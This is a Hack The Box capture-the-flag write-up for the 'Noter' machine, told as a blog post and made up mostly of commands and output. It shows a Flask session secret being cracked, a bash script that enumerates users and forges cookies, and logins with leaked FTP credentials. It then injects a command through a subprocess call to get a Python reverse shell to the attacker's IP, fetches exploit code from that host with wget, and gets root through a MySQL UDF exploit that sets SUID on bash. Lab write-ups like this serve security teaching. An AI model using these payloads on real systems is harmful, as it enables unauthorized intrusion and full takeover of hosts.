---
layout: single
title: Noter HTB writeup
excerpt: "Medium linux machine in which we exploit flask-JWT we create a Bash script, exploit a RCE and get root with MySQL"
date: 2022-08-12
classes: wide
header:
  teaser: /assets/images/noter/icon-noter.png
  teaser_home_page: true
  icon: /assets/images/hackthebox.webp
categories:
  - writeup
tags:
  - hackthebox
  - JWT
  - flask
  - MySQL
  - bash scripting
---

![](/assets/images/noter/noter.png)

# Noter

```shell
PORT     STATE SERVICE REASON
21/tcp   open  ftp     syn-ack ttl 63
22/tcp   open  ssh     syn-ack ttl 63
5000/tcp open  upnp    syn-ack ttl 63
```

At first I thought I had to do upnp spoofing but I quickly realized port 5000 it's just a web page. As I always think I tried to hack the main functionality in this case the notes you can create yet I couldn't. Then I looked at the session cookie and found a JWT (easy to identify since it starts with **ey**). However it is not exactly a JWT it is a flask JWT that can easily be cracked

```shell
flask-unsign --unsign --no-literal-eval --wordlist ~/wordlist/rockyou.txt --cookie eyJsb2dnZWRfaW4iOnRydWUsInVzZXJuYW1lIjoiZGFzb3IifQ.YvkQDA.ElTcToWybDPRe6tSdECarYQg5qw
[*] Session decodes to: {'logged_in': True, 'username': 'dasor'}
[*] Starting brute-forcer with 8 threads..
[+] Found secret key after 17152 attempts
b'secret123'
```

I tried to create some cookies with names like administrator or admin but there was no success. However I found a way to enumerate users via the error page in the login. Invalid credentials means user does not exist and Invalid login means invalid password, So I did a bash script (quite slow) to find a user

```shell
#!/bin/bash

if [ $# -ne 1 ]
then
        echo "Use: $0 wordlist"
        exit 1
fi

if [ ! -r $1 ]
then
        echo "error wordlist not found or not readable"
        exit 1
fi

while read line
do
        curl -s -X POST -d "username=$line&password=caca" http://10.10.11.160:5000/login | grep "Invalid login" &>/dev/null
        if [ $? -eq 0 ]
        then
                echo " [+] user found: $line"
                cookie=$(flask-unsign --sign --secret 'secret123' --cookie "{'logged_in': True, 'username': '$line'}")
                echo "  [+] this is the cookie: $cookie"
                exit 1
        fi
        echo "[+] testing user: $line"
done < $1
```

And found the user blue

```shell
./script.sh wl
...
 [+] user found: blue
        [+] this is the cookie: eyJsb2dnZWRfaW4iOnRydWUsInVzZXJuYW1lIjoiYmx1ZSJ9.YvkR6A.cLoP9y92fQTuJmlVe3XAY2gaqLc

```

Now we are a VIP user and we have access to some notes that have credentials


```
Hello, Thank you for choosing our premium service. Now you are capable of
doing many more things with our application. All the information you are going
to need are on the Email we sent you. By the way, now you can access our FTP
service as well. Your username is 'blue' and the password is 'blue@Noter!'.
Make sure to remember them and delete this.
(Additional information are included in the attachments we sent along the
Email)

We all hope you enjoy our service. Thanks!

ftp_admin
```

I tried to login as blue with ssh but it did not work, however I tried ftp and it worked!.

```shell
ftp noter.htb
Connected to noter.htb.
220 (vsFTPd 3.0.3)
Name (noter.htb:dasor): blue
331 Please specify the password.
Password:
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
drwxr-xr-x    2 1002     1002         4096 May 02 23:05 files
-rw-r--r--    1 1002     1002        12569 Dec 24  2021 policy.pdf
226 Directory send OK.
```

The policy pdf had interesting data like the line saying "4. Default user-password generated by the application is in the format of "username@site\_name!" (This applies to all your applications)". So that means we can connect as ftp\_admin with password ftp\_admin@Noter!


```shell
Connected to noter.htb.
220 (vsFTPd 3.0.3)
Name (noter.htb:dasor): ftp_admin
331 Please specify the password.
Password:
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
-rw-r--r--    1 1003     1003        25559 Nov 01  2021 app_backup_1635803546.zip
-rw-r--r--    1 1003     1003        26298 Dec 01  2021 app_backup_1638395546.zip
226 Directory send OK.
```

Once unzipped the backups contains the source code and a password for a SQL database. Also in the source code a flaw can be spotted

```python
# Export local
@app.route('/export_note_local/<string:id>', methods=['GET'])
@is_logged_in
def export_note_local(id):
    if check_VIP(session['username']):

        cur = mysql.connection.cursor()

        result = cur.execute("SELECT * FROM notes WHERE id = %s and author = %s", (id,session['username']))

        if result > 0:
            note = cur.fetchone()

            rand_int = random.randint(1,10000)
            command = f"node misc/md-to-pdf.js  $'{note['body']}' {rand_int}"
            subprocess.run(command, shell=True, executable="/bin/bash")

            return send_file(attachment_dir + str(rand_int) +'.pdf', as_attachment=True)

        else:
            return render_template('dashboard.html')
    else:
        abort(403)

```

The line that starts with subprocess.run makes a RCE possible so if we create a payload.md and export it form our pc a reverse shell can be obtained

```python
';python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.60",7777));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("sh")' #
```

Then let's fix the tty with

```shell
[dasor@archlinux ~]$ nc -lvp 7777
Connection from 10.10.11.160:42716
$ python3 -c 'import pty; pty.spawn("/bin/bash")'
python3 -c 'import pty; pty.spawn("/bin/bash")'
bash-5.0$ ^Z
zsh: suspended  nc -lvp 7777
[dasor@archlinux ~]$ stty raw -echo; fg
[1]  + continued  nc -lvp 7777

bash-5.0$ stty rows 30 columns 132
bash-5.0$
```

Know the flag can be obtained and the way to the privilege escalation is clear

## Root flag

Since we have the root password for the SQL database let's just escalate from there with this known [exploit](https://www.exploit-db.com/exploits/1518)

```shell
bash-5.0$ wget 10.10.14.60:8000/1518.c
--2022-08-14 15:53:41--  http://10.10.14.60:8000/1518.c
Connecting to 10.10.14.60:8000... connected.
HTTP request sent, awaiting response... 200 OK
Length: 3378 (3.3K) [text/plain]
Saving to: ‘1518.c’

1518.c                           100%[==========================================================>]   3.30K  --.-KB/s    in 0s

2022-08-14 15:53:41 (8.72 MB/s) - ‘1518.c’ saved [3378/3378]

bash-5.0$ mv 1518.c raptor_udf2.c
bash-5.0$ gcc -g -c raptor_udf2.c
bash-5.0$ gcc -g -shared -Wl,-soname,raptor_udf2.so -o raptor_udf2.so raptor_udf2.o -lc
bash-5.0$ mysql -u root -p
Enter password:
Welcome to the MariaDB monitor.  Commands end with ; or \g.
Your MariaDB connection id is 20303
Server version: 10.3.32-MariaDB-0ubuntu0.20.04.1 Ubuntu 20.04

Copyright (c) 2000, 2018, Oracle, MariaDB Corporation Ab and others.

Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.

MariaDB [(none)]> use mysql;
Reading table information for completion of table and column names
You can turn off this feature to get a quicker startup with -A

Database changed
MariaDB [mysql]> create table foo(line blob);
Query OK, 0 rows affected (0.014 sec)

MariaDB [mysql]> insert into foo values(load_file('/tmp/raptor_udf2.so'));
Query OK, 1 row affected (0.003 sec)
MariaDB [mysql]> select @@plugin_dir;
+---------------------------------------------+
| @@plugin_dir                                |
+---------------------------------------------+
| /usr/lib/x86_64-linux-gnu/mariadb19/plugin/ |
+---------------------------------------------+
1 row in set (0.000 sec)
MariaDB [mysql]> select * from foo into dumpfile '/usr/lib/x86_64-linux-gnu/mariadb19/plugin/raptor_udf2.so';
Query OK, 1 row affected (0.001 sec)

MariaDB [mysql]> create function do_system returns integer soname 'raptor_udf2.so';
Query OK, 0 rows affected (0.000 sec)

MariaDB [mysql]> select * from mysql.func;
+-----------+-----+----------------+----------+
| name      | ret | dl             | type     |
+-----------+-----+----------------+----------+
| do_system |   2 | raptor_udf2.so | function |
+-----------+-----+----------------+----------+
1 row in set (0.000 sec)
MariaDB [mysql]> select do_system('chmod u+s /bin/bash');
+----------------------------------+
| do_system('chmod u+s /bin/bash') |
+----------------------------------+
|                                0 |
+----------------------------------+
1 row in set (0.002 sec)

MariaDB [mysql]> exit
Bye
bash-5.0$ bash -p
bash-5.0# whoami
root
```